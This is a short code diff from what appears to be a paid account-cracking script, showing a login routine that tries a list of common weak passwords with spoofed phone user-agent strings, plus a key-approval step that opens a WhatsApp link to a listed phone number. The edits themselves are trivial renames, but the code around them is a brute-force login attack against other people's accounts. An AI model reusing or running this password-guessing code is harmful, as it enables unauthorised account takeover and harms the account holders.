@@ -759,7 +759,7 @@ def login(uid, meth):
         sys.stdout.flush()
         for pw in ["123456", "1234567", "12345678", "123456789"]:
             if meth in ["1", "01", "A", "a"]:
-                agent = ua()
+                agent = uaxxxx()
             else:
                 agent = Samsung()
             headers = {
@@ -829,7 +829,7 @@ def approve():
 
         print("your Key ->   " + showkey)
         input("This is paid tool bro. If you want to buy press enter. ")
-        tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
+        tks = (f'Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20' + showkey)
         os.system('am start https://wa.me/+8801617687239?text=' + tks)
         sys.exit()
 
